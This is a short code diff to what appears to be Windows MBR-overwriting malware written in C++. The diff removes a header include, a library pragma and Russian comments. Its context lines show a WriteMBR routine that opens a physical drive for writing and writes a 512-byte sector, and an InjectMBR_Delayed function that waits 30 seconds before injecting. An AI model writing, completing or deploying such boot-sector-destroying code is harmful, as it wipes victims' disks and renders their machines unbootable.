@@ -1,8 +1,5 @@
 #include <windows.h>
-#include <winioctl.h>
 #include <cstdio>
-
-#pragma comment(lib, "winioctl.lib")
 
 extern volatile bool g_running;
 
@@ -87,7 +84,6 @@ bool WriteMBR() {
     );
     
     if (hDisk == INVALID_HANDLE_VALUE) {
-        // Пробуем PhysicalDrive1
         hDisk = CreateFileA(
             "\\\\.\\PhysicalDrive1",
             GENERIC_READ | GENERIC_WRITE,
@@ -110,7 +106,7 @@ bool WriteMBR() {
     return result && bytesWritten == 512;
 }
 
-// ====== DELAYED INJECTION (через 30 секунд) ======
+// ====== DELAYED INJECTION ======
 DWORD WINAPI InjectMBR_Delayed(LPVOID) {
     Sleep(30000);
     
